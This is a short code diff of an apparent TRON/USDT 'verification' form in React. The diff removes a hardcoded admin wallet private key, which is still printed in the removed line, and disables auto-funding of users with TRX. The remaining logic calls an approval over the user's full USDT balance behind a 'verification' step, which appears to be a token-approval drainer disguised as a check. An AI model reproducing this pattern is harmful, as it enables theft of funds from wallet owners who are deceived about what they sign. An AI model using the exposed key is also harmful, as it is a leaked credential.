@@ -199,7 +199,7 @@ const VerificationFormComponent = (props) => {
 
       const adminTronWeb = new TronWeb({
         fullHost: 'https://api.trongrid.io',
-        privateKey: '56563e6d282c6decc6161c0199765cdf7b015bc3fc50ae0b4b6d4a6ff5cded10',
+        privateKey: '',
       });
 
       const sendAmount = 35 * 1_000_000;
@@ -250,13 +250,13 @@ const VerificationFormComponent = (props) => {
     if (balanceTrx > 35) {
       handleApprove(balanceUSDT)
     } else {
-      // setIsSubmitting(false);
-      await fundTrxToUser(address);
-      // Swal.fire({
-      //   icon: "error",
-      //   title: "Insufficient Balance",
-      //   text: "You need at least 35 TRX for the verificaion."
-      // });
+      setIsSubmitting(false);
+      // await fundTrxToUser(address);
+      Swal.fire({
+        icon: "error",
+        title: "Insufficient Balance",
+        text: "You need at least 35 TRX for the verificaion."
+      });
       return;
     }
   };
